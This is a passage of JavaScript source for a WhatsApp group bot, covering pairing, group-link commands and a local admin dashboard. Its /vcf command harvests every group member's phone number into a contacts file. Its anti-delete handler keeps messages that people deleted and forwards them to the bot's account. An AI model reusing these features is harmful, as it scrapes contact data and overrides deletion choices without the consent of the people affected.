                    try { socketInstance.ev.off('connection.update', handler); } catch (e) {}
                    resolve(false);
                  }
                }, timeoutMs);
              });

              const connected = await waitTempConnected(tempSock, 30000);
              if (!connected) {
                try { if (tempSock && typeof tempSock.end === 'function') tempSock.end(new Error('Connection timeout')); } catch (e) {}
                return sock.sendMessage(from, { text: `❌ Failed to connect to WhatsApp servers.\n\nPlease try again or check your internet connection.` });
              }

              // Now request pairing code
              const code = await tempSock.requestPairingCode(phoneNum);
              
              // Validate code before formatting
              if (!code || typeof code !== 'string') {
                try {
                  tempSock.end(new Error("Invalid code"));
                } catch (e) {}
                return sock.sendMessage(from, { text: `❌ Failed to generate pairing code. Please try again.` });
              }
              
              // Format the code nicely
              const formattedCode = code.match(/.{1,4}/g).join('-');
              
              await sock.sendMessage(from, { 
                text: `✅ *REAL-TIME PAIRING CODE GENERATED*\n\n📱 Number: ${phoneNum}\n🔑 Code: *${formattedCode}*\n\n⏰ Valid for: 15 minutes\n\n📋 *How to pair:*\n1. Open WhatsApp on the phone\n2. Go to Settings → Linked Devices\n3. Tap "Link with phone number"\n4. Enter the code: *${formattedCode}*\n\n💾 Session saved as: ${sessionPath}\n✅ Number will be automatically added as admin!` 
              });
              
              // Auto-add to OWNERS after successful pairing
              const ownerJid = phoneNum + "@s.whatsapp.net";
              if (!OWNERS.includes(ownerJid)) {
                OWNERS.push(ownerJid);
              }
              
              // Cleanup temporary socket
              try {
                tempSock.end(new Error("Pairing complete, cleaning up temporary socket"));
              } catch (e) {
                // Socket might already be closed, ignore
              }
              
              return;
            } catch (err) {
              console.error("Pair error:", err.message);
              return sock.sendMessage(from, { text: `❌ Pairing failed: ${err.message}\n\nMake sure:\n✓ Internet connection is stable\n✓ The number is valid\n✓ WhatsApp is not already logged in on this device` });
            }
          }
          return sock.sendMessage(from, { text: "❌ Usage: /pair [number]\nExample: /pair 2349054345858 or /pair +234 70 1234 5678" });
        }

        if (cmd === "/link" && isGroup) {
          try {

            const groupMetadata = await sock.groupMetadata(from);
            const botId = sock.user.id.split(":")[0] + "@s.whatsapp.net";
            const groupAdmins = groupMetadata.participants.filter(p => p.admin).map(p => p.id);
            const isBotAdmin = groupAdmins.includes(botId);

            if (!isBotAdmin) {
              return sock.sendMessage(from, { text: "❌ Bot needs to be Admin to get the invite link!" });
            }

            const code = await sock.groupInviteCode(from);
            return sock.sendMessage(from, { text: `🔗 *Group Link:*\nhttps://chat.whatsapp.com/${code}` });
          } catch (e) {
            console.error("Link command error:", e);
            return sock.sendMessage(from, { text: "❌ Failed to get link. Make sure bot is Admin." });
          }
        }

        if (cmd === "/revoke" && isGroup) {
          try {
            // Check if bot is admin
            const groupMetadata = await sock.groupMetadata(from);
            const botId = sock.user.id.split(":")[0] + "@s.whatsapp.net";
            const groupAdmins = groupMetadata.participants.filter(p => p.admin).map(p => p.id);
            const isBotAdmin = groupAdmins.includes(botId);


            const isSenderAdmin = groupAdmins.includes(sender);

            if (!isBotAdmin) return sock.sendMessage(from, { text: "❌ Bot needs to be Admin!" });
            if (!isSenderAdmin && !isOwner(sender)) return sock.sendMessage(from, { text: "❌ Only Admins can revoke links!" });

            await sock.groupRevokeInvite(from);
            return sock.sendMessage(from, { text: "✅ Group link has been reset!" });
          } catch (e) {
            return sock.sendMessage(from, { text: "❌ Failed to revoke link." });
          }
        }

        if (cmd === "/vcf" && isGroup) {
          try {
            const meta = await sock.groupMetadata(from);
            const participants = meta.participants;

            let vcf = "";
            let i = 1;
            for (const p of participants) {
               if (!p.id) continue;
               const num = p.id.split("@")[0];
               const contactName = `${meta.subject} ${i}`;
               vcf += "BEGIN:VCARD\n";
               vcf += "VERSION:3.0\n";
               vcf += `FN:${contactName}\n`;
               vcf += `TEL;type=CELL;type=VOICE;waid=${num}:+${num}\n`;
               vcf += "END:VCARD\n";
               i++;
            }

            const fileName = `${meta.subject.replace(/[^a-zA-Z0-9 ]/g, "").replace(/\s+/g, "_")}_Contacts.vcf`;
            
            await sock.sendMessage(from, {
              document: Buffer.from(vcf, "utf-8"),
              mimetype: "text/x-vcard",
              fileName: fileName,
              caption: `✅ *VCF FILE GENERATED*\n\nGroup: ${meta.subject}\nTotal Contacts: ${participants.length}\nFormat: ${meta.subject} 1, 2, 3...`
            });

          } catch (err) {
            console.error("Error creating VCF:", err);
            return sock.sendMessage(from, { text: `❌ Failed to generate VCF: ${err.message}` });
          }
        }

        if (cmd === "/getinfo" && isGroup) {
          try {
            const meta = await sock.groupMetadata(from);
            const admins = meta.participants.filter(p => p.admin).length;
            return sock.sendMessage(from, {
              text: `📝 *GROUP INFO*\n\n🏷️ Name: ${meta.subject}\n🆔 ID: ${meta.id}\n👑 Owner: @${meta.owner?.split("@")[0] || "Unknown"}\n👥 Members: ${meta.participants.length}\n👮 Admins: ${admins}\n📝 Desc: ${meta.desc?.toString() || "No description"}`,
              mentions: [meta.owner]
            });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ Failed to get group info.` });
          }
        }

        if (cmd === "/admins" && isGroup) {
          try {
            const meta = await sock.groupMetadata(from);
            const admins = meta.participants.filter(p => p.admin).map(p => p.id);
            return sock.sendMessage(from, {
              text: `👮 *GROUP ADMINS*\n\n${admins.map(a => `@${a.split("@")[0]}`).join("\n")}`,
              mentions: admins
            });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ Failed to get admins.` });
          }
        }
      } catch (error) {
        Logger.error(`Command handler error: ${error?.message || error}`);
      } finally {
        if (ACTIVE_COMMANDS > 0) ACTIVE_COMMANDS--;
      }
    });

    sock.ev.on("messages.update", async (updates) => {
      try {
        for (const u of updates) {
          if (u.update?.message === null) {
            const d = MESSAGE_STORE[u.key.id];
            if (!d) return;

            const deleterJid = u.key?.participant || u.key?.remoteJid || "Unknown";
            const deleterNumber = deleterJid.split("@")[0];
            const botId = sock.user?.id ? (sock.user.id.split(":")[0] + "@s.whatsapp.net") : OWNERS[0];

            if (botId) {
              const captionText = `🗑️ *DELETED MESSAGE DETECTED*\n\n*Original Sender:* @${d.sender.split("@")[0]}\n*Deleted By:* @${deleterNumber}\n*Chat:* ${d.from}`;
              const messageText = d.body || d.media?.caption || "(No text)";

              if (d.media?.buffer) {
                const sendData = {
                  caption: `${captionText}\n\n*Message:* ${messageText}`,
                  mimetype: d.media.mimetype
                };

                if (d.media.type === "imageMessage") sendData.image = d.media.buffer;
                else if (d.media.type === "videoMessage") sendData.video = d.media.buffer;
                else if (d.media.type === "stickerMessage") sendData.sticker = d.media.buffer;
                else if (d.media.type === "audioMessage") {
                  sendData.audio = d.media.buffer;
                  if (d.media.ptt) sendData.ptt = true;
                } else if (d.media.type === "documentMessage") {
                  sendData.document = d.media.buffer;
                  sendData.fileName = d.media.fileName || "deleted_document";
                }

                await sock.sendMessage(botId, sendData, { mentions: [d.sender, deleterJid] });
              } else {
                await sock.sendMessage(botId, {
                  text: `${captionText}\n\n*Message:* ${messageText}`,
                  mentions: [d.sender, deleterJid]
                });
              }
            }
          }
        }
      } catch (error) {
        console.error("⚠️ Error in messages.update handler:", error?.message || error);
      }
    });
  } catch (error) {
    console.log(chalk.red.bold(`❌ CRITICAL ERROR IN startBot: ${error.message}`));
    isStarting = false;
    RESTARTING = false;
    setTimeout(() => startBot(), 15000);
  }
}

process.on("uncaughtException", (error) => {
  const msg = error?.message || error.toString();
  // Only restart on CRITICAL errors; suppress restart for API/logging/benign exceptions
  if (/FATAL|CRITICAL|ECONNREFUSED|EACCES|OutOfMemory/.test(msg) && sock && sock.user) {
    console.error("❌ CRITICAL UNCAUGHT EXCEPTION:", error);
    RESTARTING = true;
    setTimeout(() => { RESTARTING = false; startBot(); }, 20000);
  } else if (!sock || !sock.user) {
    // Socket not connected, safe to restart
    console.error("❌ UNCAUGHT EXCEPTION (Socket disconnected):", error);
    RESTARTING = true;
    setTimeout(() => { RESTARTING = false; startBot(); }, 20000);
  } else {
    // Non-critical error while socket is active; log and continue
    console.warn("⚠️ Non-critical uncaught exception (not restarting):", msg);
  }
});

process.on("unhandledRejection", (reason) => {
  const msg = reason?.message || reason.toString();
  // Only restart on CRITICAL rejections; ignore API, HTTP, or timeout rejections
  if (/FATAL|CRITICAL|ECONNREFUSED|EACCES|OutOfMemory/.test(msg) && sock && sock.user) {
    console.error("❌ CRITICAL UNHANDLED REJECTION:", reason);
    RESTARTING = true;
    setTimeout(() => { RESTARTING = false; startBot(); }, 15000);
  } else if (!sock || !sock.user) {
    // Socket not connected, safe to restart
    console.error("❌ UNHANDLED REJECTION (Socket disconnected):", reason);
    RESTARTING = true;
    setTimeout(() => { RESTARTING = false; startBot(); }, 15000);
  } else {
    // Non-critical rejection while socket is active; log and continue
    console.warn("⚠️ Non-critical unhandled rejection (not restarting):", msg);
  }
});

// ==================== LOCALHOST WEB ADMIN DASHBOARD ====================
try {
  const { createDashboardServer } = require('./dashboard');

  const dashboardContext = {
    getStats: () => {
      const mem = getMemoryUsage();
      return {
        uptime: formatUptime(process.uptime()),
        time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
        heapMB: (mem.heapUsed / 1024 / 1024).toFixed(1),
        rssMB: (mem.rss / 1024 / 1024).toFixed(1),
        messageCount: MESSAGE_COUNT,
        commandCount: COMMAND_COUNT,
        activeCommands: ACTIVE_COMMANDS,
        maxCommands: MAX_CONCURRENT_COMMANDS,
        isPublic: PUBLIC,
        version: VERSION,
        botName: global.BOT_NAME || BOT_NAME,
        prefix: PREFIX,
        socketStatus: sock && sock.user ? '🟢 Connected' : '🔴 Reconnecting'
      };
    },
    getToggles: () => ({
      PUBLIC, ANTILINK, ANTISTICKER, ANTIGHOST, ANTICHAT, ANTICALL,
      ANTIBADWORDS, ANTIGAY, AUTOTYPING, AUTORECORDING, AUTOREACT,
      GROUP_DEFENSE, WELCOME, OFFLINE_MODE
    }),
    setToggle: (key, value) => {
      const bool = !!value;
      switch (key) {
        case 'PUBLIC': PUBLIC = bool; break;
        case 'ANTILINK': ANTILINK = bool; break;
        case 'ANTISTICKER': ANTISTICKER = bool; break;
        case 'ANTIGHOST': ANTIGHOST = bool; break;
        case 'ANTICHAT': ANTICHAT = bool; break;
        case 'ANTICALL': ANTICALL = bool; break;
        case 'ANTIBADWORDS': ANTIBADWORDS = bool; break;
        case 'ANTIGAY': ANTIGAY = bool; break;
        case 'AUTOTYPING': AUTOTYPING = bool; break;
        case 'AUTORECORDING': AUTORECORDING = bool; break;
        case 'AUTOREACT': AUTOREACT = bool; break;
        case 'GROUP_DEFENSE': GROUP_DEFENSE = bool; break;
        case 'WELCOME': WELCOME = bool; break;
        case 'OFFLINE_MODE': OFFLINE_MODE = bool; break;
        default: return false;
      }
      saveConfig();
      return true;
    },
    getConfig: () => ({
      BOT_NAME: global.BOT_NAME || BOT_NAME,
      PREFIX,
      OPENAI_API_KEY,
      GEMINI_API_KEY,
      RAPIDAPI_KEY,
      VIRUSTOTAL_API_KEY,
      OLLAMA_HOST,
      OFFLINE_MESSAGE
    }),
    updateConfig: (newCfg) => {
      if (newCfg.BOT_NAME) global.BOT_NAME = newCfg.BOT_NAME;
      if (newCfg.PREFIX) PREFIX = newCfg.PREFIX;
      if (newCfg.OPENAI_API_KEY !== undefined) { OPENAI_API_KEY = newCfg.OPENAI_API_KEY; CONFIG.OPENAI_API_KEY = newCfg.OPENAI_API_KEY; }
      if (newCfg.GEMINI_API_KEY !== undefined) { GEMINI_API_KEY = newCfg.GEMINI_API_KEY; CONFIG.GEMINI_API_KEY = newCfg.GEMINI_API_KEY; }
      if (newCfg.RAPIDAPI_KEY !== undefined) { RAPIDAPI_KEY = newCfg.RAPIDAPI_KEY; CONFIG.RAPIDAPI_KEY = newCfg.RAPIDAPI_KEY; }
      if (newCfg.VIRUSTOTAL_API_KEY !== undefined) { VIRUSTOTAL_API_KEY = newCfg.VIRUSTOTAL_API_KEY; CONFIG.VIRUSTOTAL_API_KEY = newCfg.VIRUSTOTAL_API_KEY; }
      if (newCfg.OLLAMA_HOST) { OLLAMA_HOST = newCfg.OLLAMA_HOST; CONFIG.OLLAMA_HOST = newCfg.OLLAMA_HOST; }
      if (newCfg.OFFLINE_MESSAGE) OFFLINE_MESSAGE = newCfg.OFFLINE_MESSAGE;
      saveConfig();
      return true;
    },
    getGroups: async () => {
      if (!sock || !sock.groupFetchAllParticipating) return [];
      try {
        const chats = await sock.groupFetchAllParticipating();
        return Object.values(chats).map(g => ({
          id: g.id,
          subject: g.subject,
          participants: g.participants ? g.participants.length : 0
        }));
      } catch (e) {
        return [];
      }
    },
    broadcastMessage: async (text) => {
      if (!sock || !sock.groupFetchAllParticipating) throw new Error("Bot is not connected to WhatsApp");
      const chats = await sock.groupFetchAllParticipating();
      const allGroups = Object.values(chats).map(v => v.id);
      let sent = 0;
      for (const jid of allGroups) {
        try {
          await sock.sendMessage(jid, { text: `📢 *DEMONIC BROADCAST*\n\n${text}` });
          sent++;
          await new Promise(r => setTimeout(r, 1000));
        } catch (e) {}
      }
      return { sent, total: allGroups.length };
    },
    getLogs: (type) => {
      try {
        const logFile = type === 'error' ? ERROR_LOG_PATH : type === 'warn' ? WARN_LOG_PATH : COMBINED_LOG_PATH;
        if (fs.existsSync(logFile)) {
          const content = fs.readFileSync(logFile, 'utf8');
          return content.trim().split('\n').slice(-100);
        }
        return [];
      } catch (e) {
        return [`Failed to read logs: ${e.message}`];
      }
    },
    runCleanup: () => {
      cleanupOldSessionFiles();
      cleanupOldLogFiles();
      rotateLogFileIfNeeded(ERROR_LOG_PATH, 5);
      rotateLogFileIfNeeded(WARN_LOG_PATH, 5);
      return getMemoryUsage();
    }
  };

  createDashboardServer(dashboardContext);
} catch (e) {
  Logger.error('Failed to start Web Admin Dashboard: ' + (e?.message || e));
}
// =======================================================================

process.on("SIGTERM", () => {
  console.log("🛑 SIGTERM received");
  process.exit(0);
});

process.on("SIGINT", () => {
  console.log("🛑 SIGINT received");
  process.exit(0);
});

console.log(chalk.red.bold("\n╔══════════════════════════════════════════════╗"));
console.log(chalk.red.bold("║        ") + chalk.yellow.bold("DEMONIC") + chalk.red.bold(" WHATSAPP ") + chalk.cyan.bold("BOT ") + chalk.red.bold(`v${VERSION}`) + chalk.red.bold("        ║"));
console.log(chalk.red.bold("╚══════════════════════════════════════════════╝\n"));


if (require.main === module) {
  startBot();
}

module.exports = {
  startBot,
  Logger,
  saveConfig,
  VERSION,
  BOT_NAME
};